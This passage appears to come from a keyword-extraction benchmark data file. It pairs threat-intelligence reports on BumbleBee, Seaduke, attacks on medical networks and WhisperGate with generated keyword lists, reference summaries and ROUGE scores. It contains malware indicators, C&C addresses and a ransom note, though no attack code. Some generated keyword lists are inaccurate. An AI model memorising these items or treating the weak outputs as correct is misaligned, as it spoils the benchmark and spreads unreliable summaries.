on how BumbleBee works. As the client application is running on the infected device, it will communicate with the server application and show the information of the machine it is in. Details, such as computer name, external IP address, geographic location, OS, CPU, and memory, are collected by the client application.3/6Figure 6. Connection establishedFigure 7. Built-in options in server applicationBased on the options in the server application shown in Figure 7, we can determine that it supports the following functions for controlling the compromised machine:Control the victim\u2019s desktop remotelyList and manage current services statusList and manage the victim\u2019s registry keyList and manage running processes with the image names, current folder, process id and parent process idDescription Upload/download/delete/list files from the victim\u2019s environmentFunctions  (Reverse proxy) Reverse proxy to help expose a local server behind a NAT or firewall to the  (Keylogger)Execute the command shellExecute the command shellinternet Log keystrokes and clipboard contentsTable 3. Supported functionsBumbleBee\u2019s modular framework allowed it to embed a small amount of malicious code that involves stealing keystrokes and clipboard content in the client\u2019s shellcode. However, it could expand its capabilities through its server application by loading additional modules. This design proves that BumbleBee is flexible, allowing its developers to focus on the development of additional modules instead of having to rebuild the malware itself. Its structure could also reduce the risk of exposing itself to analysts and their own modules for comparison.Network communicationBumbleBee communicates over the HTTP protocol. It first creates an HTTP request that acts as a network beacon to notify the command and control (C&C) server. The POST request with the following URL, url server>/update/, is the initial network beacon. The client application will send information of the compromised machine, which is encrypted by RC4 (see Figure 8 and Figure 9) once the first connection is established successfully. All other communication traffic, except for the victim information, are encrypted between server and client applications using the RC4 and compressed by LZO (Lempel\u2013Ziv\u2013Oberhumer) algorithm.To make sure the received payload is correct, BumbleBee adopts a CRC32 checksum with reversed-presentation mode to verify the received data. For the CRC32 calculation, a self-defined value, \u201d20200105\u201d is used as the initial value (typically, the value is 0xffffffff) for checksum calculation.4/6Figure 8. Encrypted information of the compromised machineFigure 9. Decrypted information (by RC4)PersistenceDuring the investigation, we found that BumbleBee adopted several techniques for persistence. It will use different techniques depending on the configuration. Here are the techniques adopted by the BumbleBee sample we found:Abuse registry run key to repeatedly execute the malware once system boot Create Windows services to repeatedly execute malicious payloads Use Windows logon scripts automatically executed at logon initialization to establish persistence via adding a Registry key HKEY_CURRENT_USER\\Environment \"UserInitMprLogonScript\"AttributionDue to the unique modular structure and installation procedures, we started to work on a literature review to clarify if it is an exclusive tool used by a certain threat actor. We found a similar backdoor, \u201cBookWorm,\u201d revealed by Palo Alto in 2015. They share the following features:1. Both are self-extracted files and abuse legitimate executables to load self-made malware. 2. Both use the same registry value as RC4 encryption key to encrypt their payload. 3. Both use modular architecture in the conception of the backdoor. 4. Both appeared in Southeast Asia, targeting local government-related organizations (similar victimology). 5. Both use RC4 and LZO algorithms in C&C communications (similar network protocol).We think BumbleBee is likely to be the refactored BookWorm backdoor. They have similar tactics, techniques, and procedures (TTPs), unique encryption approach, and similar target sectors. According to the language (Simplified Chinese) shown in server application, we suspect that the origins and developers of BumbleBee may be in China and of Chinese descent.ConclusionSince BumbleBee and Bookworm share the same features, BumbleBee is likely a refactored form of the latter. Focusing on Asian local government targets, all signs point to a suspect linked to a Chinese hacker group.BumbleBee, being a modular framework, is not only flexible but sophisticated as it will require analysts to investigate its structure and behavior. Another aspect of having a modular framework is that they can just keep developing additional modules since it can easily be integrated with the current version of said malware.5/6With its modular capabilities, the threat may deploy additional modules that may prove dangerous. Thus, an advanced layer of protection and quick detection is needed to prevent the backdoor from taking root in the system. binC&C:\u00b7 http[:]//www[.]synolo[.]ns01[.]biz:80/update\u00b7 http[:]//118[.]163[.]105[.]130:80/updateMITRE TacticsDefense EvasionPersistencePrivilege Escalation Collection ReconnaissanceCommand and ControlResource DevelopmentTechniques T1574.002 - Hijack Execution Flow: DLL Side-Loading T1070.004 - Indicator Removal on Host: File Deletion T1055 - Process Injection T1480.001 - Execution Guardrails: Environmental Keying T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1037.001 - Boot or Logon Initialization Scripts: Logon Script (Windows) T1548.003 - Create or Modify System Process: Windows Service T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control T1056.001 - Input Capture: Keylogging T1592 - Gather Victim Host Information T1071.001 - Application Layer Protocol: Web Protocols T1090 - Proxy T1573.001 - Encrypted Channel: Symmetric Cryptography T1132.001 - Data Encoding: Standard Encoding T1587.001 - Develop Capabilities: Malware6/6 ", "generated_text": "BumbleBee; a modular backdoor; the client application; a server; a client application; a server; the module; modules; XcrSvr.exe; DLL; XecureIO_v20.dll; the shellcode; the module; control; process; keystrokes; data; the backdoor; a control; port; the malware; the Bumblebee loader; ransomware groups; access; corporate networks; this backdoor; the Bumblebee malware; a refactored version; BookWorm; execution; components; the malware; a control; a controller application; future versions.", "ref_text": "<START-1>The PDF describes a new modular backdoor malware called BumbleBee that was investigated starting in March 2021. BumbleBee has a unique layered architecture and modular framework that makes analysis challenging. It is comprised of a client application that gets installed on target devices, and a controller server application. The client application uses a layered deployment method, abusing a legitimate executable to load a side-loaded DLL, which then decrypts and executes shellcode containing the main malicious modules. The installer module establishes persistence and deletes original files. Encrypted payloads are decrypted at runtime using a key derived from the infected system. The server application allows threat actors to control compromised devices remotely. It supports functions like file management, command execution, keylogging, etc. Communications between client and server are encrypted using RC4 and LZO algorithms. BumbleBee shares many similarities with an older backdoor called BookWorm, leading researchers to believe it is a refactored version of BookWorm. Both have targeted local governments in Asia. Other common TTPs include modular architecture, encryption methods, and victimology. This suggests BumbleBee may originate from a Chinese hacking group. BumbleBee's modular design makes it flexible and extensible for attackers to add new capabilities without rewriting the entire malware. The initial malware has limited functionality to evade detection, but modules can expand functionality later. Advanced protections are needed to detect and block this sophisticated backdoor malware. <END-1>", "t5/keyword/hint_hit_precision": 0.2857142857142857, "t5/word/hint_hit_recall": 0.0752212389380531, "gpt3/lexical/rouge_rouge1": 0.4037267080745342, "gpt3/lexical/rouge_rouge2": 0.1375, "gpt3/lexical/rouge_rougeL": 0.26086956521739124, "gpt3/lexical/rouge_rougeLsum": 0.26086956521739124, "gpt3_generated_text": ["The article explores BumbleBee, a new modular backdoor evolved from BookWorm, with a unique architecture that includes a client and server application. The client application, found in security breaches, has a layered deployment structure with legitimate executables, DLLs, and shellcode. The shellcode contains various modules, including a keylogger and installer, allowing threat actors to control the compromised machine. BumbleBee is suspected to be deployed by malicious Chinese actors and has only been seen in Taiwan. It is important to note that this Bumblebee malware is different from the Bumblebee loader used by ransomware groups."]}, {"split_name": "val", "sample_id": "val_108", "prompt_text": "Extract the keywords: \"Forkmeiamfamous\": Seaduke, latest weapon in the Duke armory Low-profile information-stealing Trojan is used only against high- value targets.Symantec has uncovered an elusive Trojan used by the cyberespionage group behind the \u00e2\u20ac\u0153Duke\u00e2\u20ac  family of malware. Seaduke (detected by Symantec as Trojan.Seaduke) is a low-profile information- stealing Trojan which appears to be reserved for attacks against a small number of high-value targets. Seaduke has been used in attacks against a number of major, government-level targets. The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and exfiltrating sensitive information such as email from the victim\u00e2\u20ac\u2122s computer. Seaduke has a highly configurable framework and Symantec has already found hundreds of different configurations on compromised networks. Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high-level government targets. While the Duke group began to distribute Cozyduke in an increasingly aggressive manner, Seaduke installations were reserved only for select targets. Seaduke victims are generally first infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke. Background The group behind Seaduke is a cyberespionage operation that is responsible for a series of attacks against high-profile individuals and organizations in government, international policy and private research in the United States and Europe. It has a range of malware tools at its disposal, known as the Dukes, including Cozyduke (Trojan.Cozer), Miniduke (Backdoor.Miniduke) and Cosmicduke (Backdoor.Tinybaron).News of the Duke group first emerged in March and April of 2015, when reports detailing attacks involving a sophisticated threat actor variously called Office Monkeys, EuroAPT, Cozy Bear, and Cozyduke were published. Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010. The group began its current campaign as early as March 2014, when Trojan.Cozer (aka Cozyduke) was identified on the network of a private research institute in Washington, D.C. In the months that followed, the Duke group began to target victims with \u00e2\u20ac\u0153Office Monkeys\u00e2\u20ac - and \u00e2\u20ac\u0153eFax\u00e2\u20ac -themed emails, booby-trapped with a Cozyduke payload. These tactics were atypical of a cyberespionage group. It\u00e2\u20ac\u2122s quite likely these themes were deliberately chosen to act as a smokescreen, hiding the true intent of the adversary.Figure 1. Cozyduke campaign used an \u00e2\u20ac\u0153Office Monkeys\u00e2\u20ac  video as a lure\u00e2\u20ac\u201cJuly 2014 The Duke group has mounted an extended campaign targeting high-profile networks over extended periods, something which is far beyond the reach of the majority of threat actors. Its capabilities include:Attack infrastructure leveraging hundreds of compromised websites Rapidly developed malware frameworks in concurrent use Sophisticated operators with fine-tuned computer network exploitation (CNE) skillsAlthough Cozyduke activity was first identified in March 2014, it wasn\u00e2\u20ac\u2122t until July that the group managed to successfully compromise high-profile government networks. Cozyduke was used throughout these attacks to harvest and exfiltrate sensitive information to the attackers. In parallel, the Duke group was also installing separate malware onto these networks, namely Backdoor.Miniduke and the more elusive Trojan.Seaduke. It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms. The Miniduke payload In July of 2014, the group instructed Cozyduke-infected computers to install Backdoor.Miniduke onto a compromised network. Miniduke has been the group\u00e2\u20ac\u2122s tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states. \u00e2\u20ac\u0153Nemesis Gemina\u00e2\u20ac  appears to be the internal name for the framework used by the group to identify the project, previously reported by Kaspersky. The following debug string was present in the sample used in these attacks:C:\\Projects\\nemesis-gemina\\nemesis\\bin\\carriers\\ezlzma_x86_exe.pdbThis project name has been seen in Backdoor.Tinybaron (aka Cosmicduke) samples, which Symantec also attributes to the Duke group. This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks. The Seaduke payload These attacks were already well underway when another group began to deploy a previously unknown piece of malware. In October 2014, the Seaduke payload began to appear within target networks. Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation. It\u00e2\u20ac\u2122s unclear why the attackers waited until October to deploy Seaduke. Was it reserved for a more specific attack? Was part of their cover blown, necessitating the use of an alternative framework? The Seaduke framework was designed to be highly configurable. Hundreds of reconfigurations were identified on compromised networks. The communication protocol employed had many layers of encryption and obfuscation, using over 200 compromised web servers for command and control. Seaduke required a significant investment of time and resources in the preparatory and operational phases of the The attackers control Cozyduke via compromised websites, issuing instructions to infected machines by uploading \u00e2\u20ac\u0153tasks\u00e2\u20ac  to a database file. Cozyduke will periodically contact these websites to retrieve task information to be executed on the local machine. One such task (an encoded PowerShell script) instructed Cozyduke to download and execute Seaduke from a compromised website.Figure 2. How the attacker tasks Cozer to install Seaduke Seaduke operation The attackers can operate Seaduke in a broadly similar fashion to Cozyduke. The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting thetarget network. Unlike Cozyduke, Seaduke operators upload \u00e2\u20ac\u0153task\u00e2\u20ac  files directly to the command- and-control (C&C) server; there is no database as such present. Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). To an untrained eye, the communications look fairly benign, no doubt an effort to stay under the radar on compromised networks.Figure 3. How Seaduke operates on the target network Seaduke has many inbuilt commands which are available to the attackers. They have the ability to retrieve detailed bot/system information, update bot configuration, upload files, download files, and self- delete the malware from the system. The self-delete function is interestingly called \u00e2\u20ac\u0153seppuku\u00e2\u20ac . This is a form of Japanese ritual suicide. Seaduke payloads The attackers have also developed a number of additional payloads. Operators can push these payloads onto infected machines for very specific attacks.Impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) Email extraction from the MS Exchange Server using compromised credentials Archiving sensitive information Data exfiltration via legitimate cloud services Secure file deletionWhat next? The Duke group has brought its operational capability to the next level. Its attacks have been so bold and aggressive, that a huge amount of attention has been drawn to it, yet it appears to be unperturbed. Its success at compromising such high-profile targets has no doubt added a few feathers to its cap. Even the developers reveled in this fact, naming one of Seaduke\u00e2\u20ac\u2122s functions \u00e2\u20ac\u0153forkmeiamfamous\u00e2\u20ac . While the group is currently keeping a lower profile, there\u00e2\u20ac\u2122s no doubt it will reappear. Some tools may have to be abandoned, some reworked and others built completely from scratch. This attack group is in it for the long haul. ", "generated_text": "Symantec; a low-profile information-stealing Trojan; a low-profile information-stealing Trojan; attacks; a small number; high-value targets; emails; malware; Cozyduke; Miniduke; Backdoor; Tinybaron; security; the malware; sophisticated operators; the target; compromise; compromised computers; the attackers; the malware; multiple fronts; persistence; the attackers; the malware; techniques; the techniques; high-value targets; documents; data; emails; documents; the attackers; their credentials; access; credentials; the attackers; obfuscation; the malware; sophisticated operators; access; the attackers; Targets; a malicious file; the user; the port; a codename; the Duke group; capabilities; tactics; the malware; targets.", "ref_text": "<START-1>Symantec analyzed a sophisticated malware called Seaduke used in targeted cyberespionage attacks. Seaduke is part of the \"Duke\" family of malware tools used by an advanced threat actor. Other tools include CozyDuke and MiniDuke. The group has been active since at least 2010, targeting government and diplomatic entities. Seaduke is reserved for high-value targets and used alongside CozyDuke for stealthy data exfiltration. The malware uses multiple layers of encryption and obfuscation to avoid detection. It has highly configurable capabilities. CozyDuke can install Seaduke via commands from the attacker's infrastructure. Seaduke C2 is separate. Seaduke features include system reconnaissance, file operations, self-deletion, and specialized payloads. The report speculates on the group's future plans to rework tools and infrastructure to continue long-term cyberespionage campaigns. <END-1>", "t5/keyword/hint_hit_precision": 0.17647058823529413, "t5/word/hint_hit_recall": 0.09016393442622951, "gpt3/lexical/rouge_rouge1": 0.4649446494464945, "gpt3/lexical/rouge_rouge2": 0.11895910780669146, "gpt3/lexical/rouge_rougeL": 0.22878228782287824, "gpt3/lexical/rouge_rougeLsum": 0.22878228782287824, "gpt3_generated_text": ["The article discusses the discovery of a new Trojan called Seaduke by Symantec, which is a low-profile information-stealing malware used against high-value targets. The Duke group, responsible for Seaduke, has a history of targeting government and diplomatic organizations since 2010. They utilize a range of malware tools such as Cozyduke, Miniduke, and Cosmicduke. The group has advanced capabilities, including sophisticated operators and rapid development of malware frameworks. Seaduke is deployed selectively after initial infection with Cozyduke, allowing the attackers to steal sensitive information like emails and documents from compromised computers. The Duke group's tactics involve using themed emails as a smokescreen to hide their true intent. They have successfully compromised high-profile networks and have the ability to exploit networks on multiple fronts for persistence. The group's techniques include leveraging compromised websites and fine-tuned computer network exploitation skills."]}, {"split_name": "val", "sample_id": "val_109", "prompt_text": "Extract the keywords: connected medicineBy Denis Makrushin, Yury Namestnikov on March 13, 2018. 3:00 pmSMART MEDICINE BREACHES ITS \u201cFIRST DO NO HAR\u2026#TheSAS2017 presentation: Smart Medicine Breaches Its \u201cFirst Do NoHarm\u201d PrincipleAt last year\u2019s Security Analyst Summit 2017 we predicted that medical networks would be a titbit for cybercriminals. Unfortunately, we were right. The numbers of medical data breaches and leaks are increasing. According to public data, this year is no exception.For a year we have been observing how cybercriminals encrypt medical data and demand a ransom for it. How they penetrate medical networks and ex\ufb01ltrate medical information, and how they \ufb01nd medical data on publicly available medical resources.The number of medical data breaches and leaks per year (source: HIPAAJournal)Opened doors in medical networksTo \ufb01nd a potential entry point into medical infrastructure, we extract the IP ranges of all organizations that have the keywords \u201cmedic\u201d, \u201cclinic\u201d, \u201chospit\u201d, \u201csurgery\u201d and \u201chealthcare\u201d in the organization\u2019s name, then we start the masscan (port scanner) and parse the specialized search engines (like Shodan and Censys) for publicly available resources of these organizations.Masscan report extractOf course, medical perimeters contain a lot of trivial opened ports and services: like web-server, DNS-server, mail-server etc. And you know that\u2019s just the tip of the iceberg. The most interesting part is the non- trivial ports. We left out trivial services, because as we mentioned in our previous article those services are out of date and need to be patched. For example, the web applications of electronic medical records that we found on the perimeters in most cases were out of date.The most popular ports are the tip of the iceberg. The most interesting part is the non-trivial ports.The most popular opened ports on medical perimeters (18,723 live hosts;27,716 opened ports)Using ZTag tool and Censys, we identify what kinds of services are hidden behind these ports. If you try to look deeper in the embedded tag you will see di\ufb00erent stu\ufb00: for example printers, SCADA-type systems, NAS etc.Top services on medical network perimetersExcluding these trivial things, we found Building Management systems that out of date. Devices using the Niagara Fox protocol usually operate on TCP ports 1911 and 4911. They allow us to gather information remotely from them, such as application name, Java version, host OS, time zone, local IP address, and software versions involved in the stack.Example of extracted information about Niagara Fox serviceOr printers that have a web interface without an authentication request. The dashboard available online and allows you to get information about internal Wi-Fi networks or, probably, it allows you to get info about documents that appeared in \u201cJob Storage\u201d logs.Shodan told us that some medical organizations have an opened port 2000. It\u2019s a smart kettle. We don\u2019t know why, but this model of kettle is very popular in medical organizations. And they have publicly available information about a vulnerability that allows a connection to the kettle to be established using a simple pass and to extract info about the current Wi-Fi connection.Medical infrastructure has a lot of medical devices, some of them portable. And devices like spirometers or blood pressure monitors support the MQTT protocol to communicate with other devices directly. One of the main components of the MQTT communication \u2013 brokers (see here for detailed information about components) are available through the Internet and, as a result, we can \ufb01nd some medical devices online.Not only Smart Home components, but also medical devices are availablevia MQTT SpirometerThreats that a\ufb00ect medical networksOK, now we know how they get in. But what\u2019s next? Do they search for personal data, or want to get some money with a ransom or maybe something else? Money? It\u2019s possible\u2026 anything is possible. Let\u2019s take a look at some numbers that we collected during 2017.The statistics are a bit worrying. More than 60% of medical organizations had some kind of malware on their servers or computers. The good news is that if we count something here, it means we\u2019ve deleted malware in the system.Attacks detected in medical organizations, 2017And there\u2019s something even more interesting \u2013 organizations closely connected to hospitals, clinics and doctors, i.e. the pharmaceutical industry. Here we see even more attacks. The pharmaceutical industry means \u201cmoney\u201d, so it\u2019s another titbit for attackers.Attacks detected in pharmaceutical organizations, 2017Let\u2019s return to our patients. Where are all these attacked hospitals and clinics? Ok, here we the numbers are relative: we divided the number of devices in medical organizations in the country with our AV by the number of devices where we detected malicious code. The TOP 3 were the Philippines, Venezuela and Thailand. Japan, Saudi Arabia and Mexico took the last three spots in the TOP 15.So the chances of being attacked really depend on how much money the government spends on cybersecurity in the public sector and the level of cybersecurity awareness.Attacked devices in medical organizations, TOP 15 countriesIn the pharmaceutical industry we have a completely di\ufb00erent picture. First place belongs to Bangladesh. I googled this topic and now the statslook absolutely ok to me. Bangladesh exports meds to Europe. In Morocco big pharma accounts for 14% of GDP. India, too, is in the list, and even some European countries are featured.Attacked devices in pharmaceutical organizations, TOP 15 countriesOn one in ten devices and in more than 25% of medical and 10% of pharmaceutical companies we detected hacktools: pentesting tools like Mimikatz, Meterpreter, tweaked remote administration kits, and so on.Which means that either medical organizations are very mature in terms of cybersecurity and perform constant audits of their own infrastructure using red teams and professional pentesters, or, more likely, their networks are infested with hackers.Hacktools: Powerpreter, Meterpreter, Remote admin, etc.APTOur research showed that APT actors are interested in information from pharmaceutical organizations. We were able to identify victims in South East Asia, or more precisely, in Vietnam and Bangladesh. The criminals had targeted servers and used the infamous PlugX malware or Cobalt Strike to ex\ufb01ltrate data.PlugX RAT, used by Chinese-speaking APT actors, allows criminals to perform various malicious operations on a system without the user\u2019s knowledge or authorization, including but not limited to copying and modifying \ufb01les, logging keystrokes, stealing passwords and capturing screenshots of user activity. PlugX, as well as Cobalt Strike, is used by cybercriminals to discreetly steal and collect sensitive or pro\ufb01table information. During our research we were unable to track the initial attackvectors, but there are signs that they could be attacks exploiting vulnerable software on servers.Taking into account the fact that hackers placed their implants on the servers of pharmaceutical companies, we can assume they are after intellectual property or business plans.How to live with itRemove all nodes that process medical data from public Periodically update your installed software and remove unwanted applications Refrain from connecting expensive equipment to the main LAN of your organizationMore tips at \u201cConnected Medicine and Its Diagnosis\u201c.INFRASTRUCTURE INTERNET OF THINGSShare post on:SECURITY POLICIESRelated Posts\uf09a \uf0d5 \uf099Somebody\u2019s are more than just \u2018smart\u2019IoT hack: how to break a smart home\u2026 againGas is too expensive? Let\u2019s make it cheap! ", "generated_text": "PDF; 2017; cybercriminals; healthcare; access; medical perimeters; a lot; trivial ports; services; the Niagara Fox protocol; open ports; vp; spirometers; MQTT; devices; devices; a vulnerability; Wi-Fi; the system; a vulnerability; the MQTT protocol; the key; MQTT communication; devices; a risk; ransom; financial gain; a ransomware infection; the pharmaceutical industry; TTP; malware; information; ransomware detection; attacks.", "ref_text": "<START-1>The document discusses security issues and threats facing medical and healthcare organizations' networks and devices. It notes that breaches of medical data are increasing each year. The report explores potential entry points into medical infrastructure by scanning IP ranges of healthcare organizations. It finds many exposed services likeprinters, building management systems, and smart devices. Over 60% of medical organizations and even more pharmaceutical companies detected malware in 2017. The top targeted countries include the Philippines, Venezuela, Thailand, Bangladesh, and India. The presence of hacking tools in 25% of medical and 10% of pharma networks suggests they are compromised. APT groups have targeted pharma companies in Vietnam and Bangladesh using PlugX and Cobalt Strike, likely to steal intellectual property and business plans. The report recommends security measures like removing nodes with patient data from the public internet, regularly updating software, avoiding connecting expensive medical devices to the main network, and other best practices. In summary, the document examines the vulnerable state of medical device and healthcare industry security, evidence of compromises by cybercriminals and APTs, and the geographic targeting, concluding significant risks exist that require implementing security strategies. <END-1>", "t5/keyword/hint_hit_precision": 0.17647058823529413, "t5/word/hint_hit_recall": 0.03208556149732621, "gpt3/lexical/rouge_rouge1": 0.3321554770318021, "gpt3/lexical/rouge_rouge2": 0.07117437722419928, "gpt3/lexical/rouge_rougeL": 0.14840989399293286, "gpt3/lexical/rouge_rougeLsum": 0.14840989399293286, "gpt3_generated_text": ["In 2017, cybercriminals targeted healthcare organizations, gaining access to medical perimeters through a variety of open ports and services. Vulnerabilities in devices such as spirometers and blood pressure monitors using the MQTT protocol allowed for easy access to sensitive information. Malware was detected in over 60% of medical organizations, posing a significant risk to patient data and the overall security of the system. Ransomware infections were a common threat, potentially leading to financial gain for attackers. It is crucial for the pharmaceutical industry to implement robust security measures to detect and prevent attacks on their networks."]}, {"split_name": "val", "sample_id": "val_110", "prompt_text": "Extract the keywords: Destructive malware targeting Ukrainian organizationsmicrosoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizationsJanuary 16, 2022Microsoft Threat Intelligence Center (MSTIC) has identified evidence of a destructive malware operation targeting multiple organizations in Ukraine. This malware first appeared on victim systems in Ukraine on January 13, 2022. Microsoft is aware of the ongoing geopolitical events in Ukraine and surrounding region and encourages organizations to use the information in this post to proactively protect from any malicious activity.While our investigation is continuing, MSTIC has not found any notable associations between this observed activity, tracked as DEV-0586, and other known activity groups. MSTIC assesses that the malware, which is designed to look like ransomware but lacking a ransom recovery mechanism, is intended to be destructive and designed to render targeted devices inoperable rather than to obtain a ransom.At present and based on Microsoft visibility, our investigation teams have identified the malware on dozens of impacted systems and that number could grow as our investigation continues. These systems span multiple government, non-profit, and information technology organizations, all based in Ukraine. We do not know the current stage of this attacker\u2019s operational cycle or how many other victim organizations may exist in Ukraine or other geographic locations. However, it is unlikely these impacted systems represent the full scope of impact as other organizations are reporting.Given the scale of the observed intrusions, MSTIC is not able to assess intent of the identified destructive actions but does believe these actions represent an elevated risk to any government agency, non-profit or enterprise located or with systems in Ukraine. We strongly encourage all organizations to immediately conduct a thorough investigation and to implement defenses using the information provided in this post. MSTIC will update this blog as we have additional information to share.As with any observed nation-state actor activity, Microsoft directly and proactively notifies customers that have been targeted or compromised, providing them with the information they need to guide their investigations. MSTIC is also actively working with members of the global security community and other strategic partners to share information that can address this evolving threat through multiple channels. Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a1/4developing cluster of threat activity, allowing MSTIC to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor or merged with existing actors.Observed actor activityOn January 13, Microsoft identified intrusion activity originating from Ukraine that appeared to be possible Master Boot Records (MBR) Wiper activity. During our investigation, we found a unique malware capability being used in intrusion attacks against multiple victim organizations in Ukraine.Stage 1: Overwrite Master Boot Record to display a faked ransom noteThe malware resides in various working directories, including C:\\PerfLogs, C:\\ProgramData, C:\\, and C:\\temp, and is often named stage1.exe. In the observed intrusions, the malware executes via Impacket, a publicly available capability often used by threat actors for lateral movement and execution.The two-stage malware overwrites the Master Boot Record (MBR) on victim systems with a ransom note (Stage 1). The MBR is the part of a hard drive that tells the computer how to load its operating system. The ransom note contains a Bitcoin wallet and Tox ID (a unique account identifier used in the Tox encrypted messaging protocol) that have not been previously observed by MSTIC:Your hard drive has been corrupted. In case you want to recover all hard drives of your organization, You should pay us $10k via bitcoin wallet 1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65 with your organization name. We will contact you to give further instructions.The malware executes when the associated device is powered down. Overwriting the MBR is atypical for cybercriminal ransomware. In reality, the ransomware note is a ruse and that the malware destructs MBR and the contents of the files it targets. There are several reasons why this activity is inconsistent with cybercriminal ransomware activity observed by MSTIC, including:Ransomware payloads are typically customized per victim. In this case, the same ransom payload was observed at multiple victims. Virtually all ransomware encrypts the contents of files on the filesystem. The malware in this case overwrites the MBR with no mechanism for recovery. Explicit payment amounts and cryptocurrency wallet addresses are rarely specified in modern criminal ransom notes, but were specified by DEV-0586. The same Bitcoin wallet address has been observed across all DEV-0586 intrusions and at the time of analysis, the only activity was a small transfer on January 14. It is rare for the communication method to be only a Tox ID, an identifier for use with the Tox encrypted messaging protocol. Typically, there are websites with support forums or multiple methods of contact (including email) to make it easy for the victim to successfully make contact. Most criminal ransom notes include a custom ID that a victim is instructed to send in their communications to the attackers. This is an important part of the process where the custom ID maps on the backend of the ransomware operation to a victim-specific decryption key. The ransom note in this case does not include a custom ID.2/4Microsoft will continue to monitor DEV-0586 activity and implement protections for our customers. The current detections, advanced detections, and IOCs in place across our security products are detailed below.Stage 2: File corrupter malwareStage2.exe is a downloader for a malicious file corrupter malware. Upon execution, stage2.exe downloads the next-stage malware hosted on a Discord channel, with the download link hardcoded in the downloader. The next-stage malware can best be described as a malicious file corrupter. Once executed in memory, the corrupter locates files in certain directories on the system with one of the following hardcoded file extensions:.3DM .3DS .7Z .ACCDB .AI .ARC .ASC .ASM .ASP .ASPX .BACKUP .BAK .BAT .BMP .BRD .BZ .BZ2 .CGM .CLASS .CMD .CONFIG .CPP .CRT .CS .CSR .CSV .DB .DBF .DCH .DER .DIF .DIP .DJVU.SH .DOC .DOCB .DOCM .DOCX .DOT .DOTM .DOTX .DWG .EDB .EML .FRM .GIF .GO .GZ .HDD .HTM .HTML .HWP .IBD .INC .INI .ISO .JAR .JAVA .JPEG .JPG .JS .JSP .KDBX .KEY .LAY .LAY6 .LDF .LOG .MAX .MDB .MDF .MML .MSG .MYD .MYI .NEF .NVRAM .ODB .ODG .ODP .ODS .ODT .OGG .ONETOC2 .OST .OTG .OTP .OTS .OTT .P12 .PAQ .PAS .PDF .PEM .PFX .PHP .PHP3 .PHP4 .PHP5 .PHP6 .PHP7 .PHPS .PHTML .PL .PNG .POT .POTM .POTX .PPAM .PPK .PPS .PPSM .PPSX .PPT .PPTM .PPTX .PS1 .PSD .PST .PY .RAR .RAW .RB .RTF .SAV .SCH .SHTML .SLDM .SLDX .SLK .SLN .SNT .SQ3 .SQL .SQLITE3 .SQLITEDB .STC .STD .STI .STW .SUO .SVG .SXC .SXD .SXI .SXM .SXW .TAR .TBK .TGZ .TIF .TIFF .TXT .UOP .UOT .VB .VBS .VCD .VDI .VHD .VMDK .VMEM .VMSD .VMSN .VMSS .VMTM .VMTX .VMX .VMXF .VSD .VSDX .VSWP .WAR .WB2 .WK1 .WKS .XHTML .XLC .XLM .XLS .XLSB .XLSM .XLSX .XLT .XLTM .XLTX .XLW .YML .ZIPIf a file carries one of the extensions above, the corrupter overwrites the contents of the file with a fixed number of 0xCC bytes (total file size of 1MB). After overwriting the contents, the destructor renames each file with a seemingly random four-byte extension. Analysis of this malware is ongoing.Recommended customer actionsMSTIC and the Microsoft security teams are working to create and implement detections for this activity. To date, Microsoft has implemented protections to detect this malware family as WhisperGate (e.g., DoS:Win32/WhisperGate.A!dha) via Microsoft Defender Antivirus and Microsoft Defender for Endpoint, wherever these are deployed on-premises and cloud environments. We are continuing the investigation and will share significant updates with affected customers, as well as public and private sector partners, as get more information. The techniques used by the actor and described in the this post can be mitigated by adopting the security considerations provided below:Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion. Review all authentication activity for remote access infrastructure, with a particular focus on accounts configured with single factor authentication, to confirm authenticity and investigate any anomalous activity. Enable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity. NOTE: Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator to secure accounts. Enable Controlled folder Access (CFA) in Microsoft Defender for Endpoint to prevent MBR/VBR modification.Indicators of compromise (IOCs)3/4The following list provides IOCs observed during our investigation. We encourage customers to investigate these indicators in their environments and implement detections and protections to identify 2>&1Command lineNOTE: These indicators should not be considered exhaustive for this observed activity.DetectionsMicrosoft 365 DefenderAntivirusHash of stage1.exeHash of intrusions.4/4 ", "generated_text": "Microsoft Threat Intelligence Center; MSTIC; January 13; intrusion activity; multiple organizations; Ukraine; the malware; Impacket; system files; the ransom note; Malware payloads; a Bitcoin wallet; Tox ID; the malware; the hard drive; The MBR; the malware; infrastructure; malware payloads; a ransom note; a Bitcoin wallet; Tox ID; command; control; data; Windows; IOCs; the operation; threats; Ukraine; the impact; organizations; defenses; the report; this activity; threat actors; summary.", "ref_text": "<START-1>The document describes destructive malware activity targeting organizations in Ukraine that was identified by Microsoft on January 13, 2022. The malware overwrites the Master Boot Record (MBR) of devices to display a fake ransom note, but lacks any actual ransom recovery mechanism. Microsoft assesses that the malware is intended to be destructive rather than obtain a ransom, with the goal of rendering targeted devices inoperable. Dozens of systems across government, non-profit, and IT organizations in Ukraine have been impacted so far. The malware has two stages - first overwriting the MBR with a fake ransom note, then downloading a corrupting component that locates and overwrites files with certain extensions to make them inaccessible. Indicators of compromise like file hashes, command lines, and the hardcoded Bitcoin wallet are provided. Microsoft has implemented detections for 